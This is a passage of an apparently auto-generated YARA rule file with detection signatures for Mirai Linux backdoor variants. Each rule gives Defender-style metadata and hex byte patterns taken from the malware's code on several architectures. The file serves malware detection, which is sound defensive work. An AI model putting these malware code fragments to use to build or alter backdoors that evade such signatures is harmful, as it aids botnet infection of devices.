        $x_1_2 = {4e 56 ff ec 61 ff 00 00 08 8a 2d 40 ff f0 61 ff 00 00 08 08 2d 40 ff f4 20 2e ff f0 b0 ae ff f4 ?? ?? 70 01 2d 40 ff ec}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_HQ_2147907547_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.HQ!MTB"
        threat_id = "2147907547"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {64 42 9f e5 00 00 a0 e3 02 19 a0 e3 7e ff ff eb 01 00 a0 e3 04 10 a0 e1 7b ff ff eb 04 10 a0 e1 02 00 a0 e3 78 ff ff eb 04 00 9d e5 3c 32 9f e5 00 20 90 e5 00 10 9d e5 03 20 81 e7 00 40 90 e5 00 00 54 e3 0d 00 00 0a 24 32 9f e5 03 30 91 e7 00 40 83 e5 2f 10 a0 e3}  //weight: 1, accuracy: High
        $x_4_2 = {5c 31 9f e5 00 10 9d e5 03 20 91 e7 02 30 a0 e1 00 00 53 e3 03 00 00 0a 0f e0 a0 e1 12 ff 2f e1 00 30 a0 e3 00 30 80 e5 10 00 8d e2 9c 00 00 eb 00 00 50 e3 12 00 00 1a a2 00 00 eb}  //weight: 4, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_HU_2147908242_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.HU!MTB"
        threat_id = "2147908242"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {10 00 02 ae 18 00 54 00 c3 1f 02 00 18 00 bc 8f 10 20 00 00 21 20 82 00 c3 23 04 00 23 20 83 00 c0 28 04 00 80 1b 04 00 23 18 65 00 23 18 64 00 80 18 03 00 23 10 43 00 ff ff 42 30 ff 00 43 30 00 1a 03 00 02 12 02 00 25 10 43 00 14 00 02 a6 08 00 64 96}  //weight: 1, accuracy: High
        $x_1_2 = {21 20 e6 00 00 00 22 91 04 00 c3 24 00 00 85 ?? 07 10 62 00 26 10 45 00 00 00 02 a1 64 00 e3 ?? 01 00 c6 24 2a 18 c3 00 01 00 29 25 f4 ?? ?? ?? 01 00 08 25 1c 00 bf 8f 18 00 b0 8f 08 00 e0 03 20 00 bd 27}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_IC_2147908243_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.IC!MTB"
        threat_id = "2147908243"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {45 31 e4 f6 07 40 74 ?? e8 f4 fc ff ff 41 83 cc ff 48 85 c0 75 ?? 48 8b 43 08 66 83 23 bf 45 31 e4 48 89 43 30 48 83 c4 28 44 89 e0}  //weight: 1, accuracy: Low
        $x_1_2 = {48 8b 45 18 48 3b 45 28 73 ?? 8a 10 48 ff c0 88 13 48 ff c3 80 fa 0a 48 89 45 18 eb ?? 48 89 ef e8 df fe ff ff 83 f8 ff}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_HR_2147908273_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.HR!MTB"
        threat_id = "2147908273"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {ff c9 83 f9 ff 74 ?? 48 63 d7 0f b6 06 41 3a 04 10 75 ?? ff c7 39 fb 75 ?? 66 ?? e9 ?? ?? ?? ?? 31 f6 bf 16 00 00 00}  //weight: 1, accuracy: Low
        $x_1_2 = {48 c7 44 24 38 00 00 00 00 0f ?? ?? ?? ?? ?? 66 c1 cd 08 66 89 6c 24 2a 44 0f b6 6c 24 27 45 85 ed 0f ?? ?? ?? ?? ?? 41 8d 45 ff 48 8b 6c 24 18 45 31 e4 48 ff c0 48 89 44 24 10}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_IA_2147908274_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.IA!MTB"
        threat_id = "2147908274"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {00 06 11 42 00 02 10 80 00 45 10 21 8c 43 00 38 00 c4 20 04 00 64 18 25 02 46 28 2a 10 ?? ?? ?? ac 43 00 38 00 c0 ?? 21 8f a2 00 2c 00 00 00 00 24 45 00 01 28 a3 01 3c 10 ?? ?? ?? af a5 00 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {24 42 00 01 30 42 00 ff 10 ?? ?? ?? a2 02 32 1c 02 60 c8 21 03 20 f8 09 02 00 20 21 8f a2 00 2c 8f bc 00 18 24 45 00 01 28 a3 01 3c 14 ?? ?? ?? af a5 00 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_IJ_2147908710_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.IJ!MTB"
        threat_id = "2147908710"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {00 00 51 e3 01 10 41 e2 0f ?? ?? ?? 01 c0 d0 e4 41 30 4c e2 19 00 53 e3 02 30 d4 e7 41 e0 43 e2 60 c0 8c 93 19 00 5e e3 60 30 83 93 03 00 5c e1 00 20 a0 13 f1 ?? ?? ?? 01 20 82 e2 02 00 55 e1 ee ?? ?? ?? 00 00 66 e0 70 80 bd e8}  //weight: 1, accuracy: Low
        $x_1_2 = {01 30 cc e7 00 20 9e e5 02 30 dc e7 03 30 25 e0 02 30 cc e7 00 10 9e e5 01 30 dc e7 03 30 24 e0 01 30 cc e7 04 20 de e5 01 30 d7 e5 01 c0 8c e2 03 24 82 e1 0c 00 52 e1 e9 ?? ?? ?? f0 80 bd e8}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_GI_2147909010_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.GI!MTB"
        threat_id = "2147909010"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {21 10 43 00 10 00 44 8c 65 58 03 24 08 00 02 24 02 00 c3 a4 10 00 04 ae 0c 00 a2 a0 0d 00 a0 a0 26 00 02 8e 0f ff 04 24 24 10 44 00 f0 ff 03 24 40 00 42 34 24 10 43 00 05 00 42 34 26 00 02 ae 58 00 a4 8f}  //weight: 1, accuracy: High
        $x_1_2 = {21 28 20 02 21 30 00 02 09 f8 20 03 21 ?? 40 00 10 00 bc 8f 0b ?? ?? ?? 21 18 40 02 21 20 53 02 f0 ff 05 24 00 00 62 ?? 00 00 00 00 26 10 45 00 1a 00 42 38 00 00 62 a0 01 00 63 24}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_HZ_2147909011_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.HZ!MTB"
        threat_id = "2147909011"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 54 31 c0 be 00 08 01 00 55 53 31 db 48 81 ec ?? 00 00 00 e8 57 fd ff ff 85 c0 89 c5 0f 88 ?? ?? ?? ?? 48 89 e6 89 c7 e8 8b 29 00 00 85 c0 78 ?? 31 c0 ba 01 00 00 00 be 02 00 00 00 89 ef}  //weight: 1, accuracy: Low
        $x_1_2 = {c7 00 00 00 00 00 be 02 00 00 00 bf 02 00 00 00 e8 86 11 00 00 89 c5 31 c0 83 fd ff 74 ?? ba 10 00 00 00 48 89 e6 89 ef 66 c7 04 24 02 00 c7 44 24 04 08 08 08 08 66 c7 44 24 02 00 35 e8 f1 0f 00 00 ?? ?? ?? ?? ?? 48 89 e6 89 ef}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_IF_2147909012_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.IF!MTB"
        threat_id = "2147909012"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {18 00 a2 27 f0 82 99 8f c0 20 04 00 21 20 44 00 21 28 00 02 09 f8 20 03 08 00 06 24 10 00 bc 8f 08 00 10 26 00 00 04 8e}  //weight: 1, accuracy: High
        $x_1_2 = {2a 10 71 00 20 00 a2 34 ff 00 43 30 61 00 62 2c 03 ?? ?? ?? a9 ff 62 24 02 ?? ?? ?? 28 00 03 24 ff 00 43 30 2a 10 71 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_IH_2147909013_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.IH!MTB"
        threat_id = "2147909013"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8f 99 80 64 8e 44 00 04 03 20 f8 09 02 20 28 21 8f bc 00 10 04 ?? ?? ?? 00 00 00 00 02 22 88 21 10 ?? ?? ?? 02 02 80 23 96 42 00 00 8e 44 00 08 8e 43 00 0c 34 42 00 08 00 64 18 23}  //weight: 1, accuracy: Low
        $x_1_2 = {96 02 00 10 8e 03 00 04 8e 07 00 0c 92 08 00 12 30 46 ff ff ae 03 00 00 ae 07 00 04 a2 08 00 0a a6 02 00 08 03 20 f8 09 24 c6 ff ed 8f bc 00 10 96 06 00 08 8f 99 80 60 02 00 20 21 03 20 f8 09 02 00 28 21 96 02 00 08 8f bc 00 10 02 02 80 21}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_II_2147909014_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.II!MTB"
        threat_id = "2147909014"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 ff 05 31 08 00 e0 03 01 00 02 24 02 22 08 00 00 ff 84 30 00 2a 05 00 02 1e 08 00 00 16 08 00 25 10 45 00 25 18 64 00 25 18 62 00 01 00 02 24 08 00 e0 03 00 00 63 ad}  //weight: 1, accuracy: High
        $x_1_2 = {14 00 84 90 02 1e 10 00 02 2a 05 00 00 32 06 00 00 86 10 00 25 18 65 00 25 80 06 02 06 10 82 00 25 18 70 00 21 18 62 00 24 38 67 00 00 ff 64 30 02 16 03 00 02 3a 07 00 00 22 04 00 00 1e 03 00 25 10 47 00 25 18 64 00 25 10 43 00 18 00 bc 8f 10 00 22 ae}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_HX_2147909857_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.HX!MTB"
        threat_id = "2147909857"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {85 2c 20 08 a0 10 80 01 03 03 42 83 82 10 61 0a 80 a4 00 01 12 bf ff f2 92 07 bf f7}  //weight: 1, accuracy: High
        $x_1_2 = {90 10 00 11 92 10 00 10 7f ff ff 94 94 10 20 80 80 a2 20 00 04 80 00 07 94 10 00 08}  //weight: 1, accuracy: High
        $x_1_3 = {94 10 20 01 7f ff ff a6 90 10 00 11 80 a2 20 01 02 80 00 05 c2 4f bf f7}  //weight: 1, accuracy: High
        $x_1_4 = {92 07 bf e4 7f ff ff ad 94 10 20 10 a0 92 20 00 36 80 00 0a}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_HY_2147909858_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.HY!MTB"
        threat_id = "2147909858"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {83 fe 01 77 ee 75 08 48 0f be 07 ?? ?? ?? ?? 48 0f b7 d1 48 c1 e9 10 48 01 ca 48 89 d0 48 c1 e8 10 48 01 d0 f7 d0 0f b7 c0 c3}  //weight: 1, accuracy: Low
        $x_1_2 = {41 55 41 89 d5 41 54 45 31 e4 55 53 48 83 ec 08 8b 5f 0c 8b 6f 10 eb 0d}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_IG_2147909859_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.IG!MTB"
        threat_id = "2147909859"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {0a 00 0a 00 34 2e 30 30 32 30 32 31 0a 00 00 00 14 30 8d e5 04 60 8e e2 00 50 a0 e3 00 40 e0 e3 03 20 a0 e3 00 10 96 e5 00 00 a0 e3 0c 10 8d e5 c0 00 90 ef 08 00 8d e5 00 30 96 e5 04 30 2d e5 0d 30 a0 e1 00 20 a0 e1 08 00 d6 e5 04 00 2d e5 04 10 96 e5 0c 00 86 e2 02 a0 a0 e1 0f e0 a0 e1 18 f0 9d e5 04 d0 8d e2 04 30 9d e4 14 10 9d e5 04 10 8a e4 05 20 a0 e3 0c 10 9d e5 08 00 9d e5 7d 00 90 ef 00 00 9d e5 04 10 16 e5 01 50 80 e0 01 40 49 e0 00 e0 8f e2 0a f0 a0 e1}  //weight: 1, accuracy: High
        $x_1_2 = {13 5f d6 09 30 8f 6d 1b 1c cb 06 a3 8b 34 3f b6 04 80 03 c3 bf 33 ba a7 09 e1 83 ef b3 93 bb 45 13 bc 02 b7 da 57 20 8a be e2 9b 23 b1 8b c3 92 e5 23 c6 1e 47 3b 92 e5 b7 0d a9 0e 23 40 f7 7b 00 47 c2 50 f3 81 b7 af ba 6f db 02 2c 1b f7 b4 fd 13 0a d7 12 cf ee f2 0f 1f 37 0e 7b f7 87 6c e2 97 0c 7d 37 9c d7 43 07 53 ba 8f 08 19 73 f7 8f 22 13 3e 1f ea e0 3b 3a e7 16 9e 82 24 1b 41 d8 a3 e1 d9 60 c3 f0 53 0c f2 93 87 80 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_IN_2147909861_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.IN!MTB"
        threat_id = "2147909861"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {21 28 60 02 21 c8 c0 03 09 f8 20 03 21 30 00 00 18 00 bc 8f 80 00 46 34 04 00 04 24 21 c8 c0 03 09 f8 20 03 21 28 60 02 18 00 bc 8f e0 10 a2 8f}  //weight: 1, accuracy: High
        $x_1_2 = {02 14 06 00 ff ff c3 30 21 18 62 00 02 14 03 00 21 10 43 00 27 10 02 00 08 00 e0 03 ff ff 42 30}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_GR_2147910129_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.GR!MTB"
        threat_id = "2147910129"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {05 00 1c 3c f4 84 9c 27 21 e0 99 03 d0 ff bd 27 28 00 bf af 10 00 bc af 5c 80 99 8f 18 00 a4 af 1c 00 a5 af 20 00 a6 af 06 10 04 24 18 00 a6 27 09 f8 20 03 03 00 05 24 10 00 bc 8f 28 00 bf 8f ?? ?? ?? ?? 08 00 e0 03 30 00 bd 27}  //weight: 1, accuracy: Low
        $x_1_2 = {05 00 1c 3c 1c 85 9c 27 21 e0 99 03 21 10 a0 00 5c 80 99 8f 21 38 c0 00 21 28 80 00 21 30 40 00 08 00 20 03 a5 0f 04 24}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_HH_2147910130_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.HH!MTB"
        threat_id = "2147910130"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3c 40 1b e5 01 00 74 e3 03 01 00 0a 02 00 54 e3 02 30 e0 03 26 ?? ?? ?? 04 00 54 e3 00 30 a0 13 01 30 a0 03}  //weight: 1, accuracy: Low
        $x_1_2 = {84 40 a0 e1 06 30 84 e2 03 30 c3 e3 0d d0 63 e0 38 c0 4b e2 04 c0 8d e5 07 00 a0 e1 3c c0 4b e2 02 10 a0 e3 60 20 4b e2 10 30 8d e2 08 c0 8d e5 00 40 8d e5 9a 03 00 eb 22 00 50 e3 03 ?? ?? ?? 3c 30 1b e5 01 00 73 e3}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_HN_2147910131_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.HN!MTB"
        threat_id = "2147910131"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {01 00 50 e3 04 c0 94 e5 0a 00 00 1a 73 2e 8d e2 ac 32 a0 e1 08 20 82 e2 03 11 82 e0 38 31 11 e5 1f 20 0c e2 10 32 83 e1 06 00 5c e1 0c 60 a0 c1 38 31 01 e5}  //weight: 1, accuracy: High
        $x_1_2 = {b4 37 9f e5 00 20 93 e5 12 3e a0 e3 ?? 23 24 e0 0c 00 94 e5 01 00 50 e3 1e 10 a0 83 02 ?? ?? ?? 00 00 50 e3 33 ?? ?? ?? 05 10 a0 e3}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_IK_2147910132_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.IK!MTB"
        threat_id = "2147910132"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {7c 08 02 a6 94 21 ff f0 7c 64 1b 78 38 60 00 01 90 01 00 14 4c c6 31 82 48 00 03 25 80 01 00 14 38 21 00 10 7c 08 03 a6 4e 80 00 20}  //weight: 1, accuracy: High
        $x_1_2 = {94 21 ff e0 7c 08 02 a6 90 61 00 08 38 60 00 66 90 81 00 0c 38 80 00 03 90 a1 00 10 38 a1 00 08 90 01 00 24 4c c6 31 82 48 00 02 85 80 01 00 24 38 21 00 20 7c 08 03 a6 4e 80 00 20}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_HT_2147910821_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.HT!MTB"
        threat_id = "2147910821"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_4_1 = {89 d0 8a 5c 24 0f 03 01 30 18 89 d0 03 01 8a 5c 24 10 30 18 89 d0 03 01 8a 5c 24 20 30 18 89 d0 89 f3 42 03 01 30 18}  //weight: 4, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_GU_2147911092_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.GU!MTB"
        threat_id = "2147911092"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {a8 00 a7 8f 20 00 a2 af 10 00 a3 af 21 20 c0 02 21 28 00 00 09 f8 20 03 03 00 06 24 18 00 bc 8f 38 ?? ?? ?? 00 00 00 00 0d 00 85 92 00 00 00 00 47 ?? ?? ?? 20 00 a0 af 1c 80 93 8f 62 10 02 3c 3c 00 a3 27 d3 4d 52 34 21 80 00 00 7c 00 be 27 58 00 b5 27 ac 00 a3 af}  //weight: 1, accuracy: Low
        $x_1_2 = {44 00 44 8c 10 00 43 8c 48 00 45 94 28 00 63 24 08 00 04 a2 ff ff 63 30 04 00 66 8e ff 00 62 30 ff 00 a4 30 00 12 02 00 00 22 04 00 02 1a 03 00 02 2a 05 00 4c 00 c7 8c 25 18 62 00 25 28 a4 00 02 00 03 a6 03 ?? ?? ?? 04 00 05 a6 40 00 02 24 06 00 02 a6}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_IM_2147911093_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.IM!MTB"
        threat_id = "2147911093"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {80 a0 60 07 32 ?? ?? ?? 92 02 60 20 e4 02 60 1c e6 02 60 14 80 a4 80 19 ec 02 60 10 ea 02 60 08 18 ?? ?? ?? a8 10 00 12 10 ?? ?? ?? a8 10 00 19 c2 00 c0 00 83 28 60 05 82 00 80 01 80 a2 40 01}  //weight: 1, accuracy: Low
        $x_1_2 = {84 89 20 ff 02 ?? ?? ?? c6 0a 40 00 82 08 e0 ff 80 a0 80 01 22 ?? ?? ?? ?? 02 20 01 82 08 e0 ff 81 c3 e0 08 ?? 20 80 01 92 02 60 01 94 02 bf ff 80 a2 a0 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_IR_2147911094_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.IR!MTB"
        threat_id = "2147911094"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {55 89 e5 53 83 ec 04 bb 00 40 05 08 a1 00 40 05 08 83 f8 ff 74 ?? 83 eb 04 ff d0 8b 03 83 f8 ff 75 ?? 58 5b 5d}  //weight: 1, accuracy: Low
        $x_1_2 = {8b 4c 24 0c 8b 5c 24 10 31 c0 8b 35 98 42 05 08 39 d9 74 ?? 0f b6 01 0f bf 14 46 0f b6 03 0f bf 04 46 29 c2 89 d0}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_FT_2147911239_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.FT!MTB"
        threat_id = "2147911239"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {02 10 41 e2 b2 30 d0 e0 01 00 51 e3 03 20 82 e0 fa ?? ?? ?? 01 00 51 e3 00 30 d0 05 03 20 82 00 02 08 a0 e1 20 08 a0 e1 22 08 80 e0 20 08 80 e0 00 00 e0 e1 00 08 a0 e1 20 08 a0 e1 1e ff 2f e1}  //weight: 1, accuracy: Low
        $x_1_2 = {00 30 85 e5 00 30 9c e5 00 30 84 e5 00 20 9c e5 00 30 9c e5 a2 39 23 e0 00 30 8c e5 00 20 9c e5 8e e5 2e e0 02 20 2e e0 2e 24 22 e0 00 20 8c e5 00 30 9c e5 04 d0 4d e2 00 40 a0 e1 01 10 60 e0 03 00 a0 e1}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_IQ_2147911542_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.IQ!MTB"
        threat_id = "2147911542"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {08 c9 08 20 44 ?? 54 e0 fe 06 b6 36 18 ?? 09 e7 63 61 c0 71 1f 52 28 22 13 ?? e3 60 85 d6 0a e3}  //weight: 1, accuracy: Low
        $x_1_2 = {48 e0 00 42 2a 32 5d d0 23 61 8a 21 28 31 ae 96 13 65 00 45 13 64 fc 36 0b 40 5a 35 a8 91 fc 31 13 62 08 32}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_IT_2147912328_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.IT!MTB"
        threat_id = "2147912328"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {c2 bf 8e 66 51 56 00 c7 a4 9b 66 58 33 0b fb c2 a9 9c 3c 44 3f 0a f1 df a8 ef 00 db a4 84 77 4d 3f 0b f1 85 bd 86 60 55 22 1d 90 00 df a8 83 7c 51 22 16 f9 cc aa 8a 60 1a 26 11 e2 ca b9 8a 12 00 df bf 86 71 5f 25 19 e2 ce f9 81 7b 53 31 1d}  //weight: 1, accuracy: High
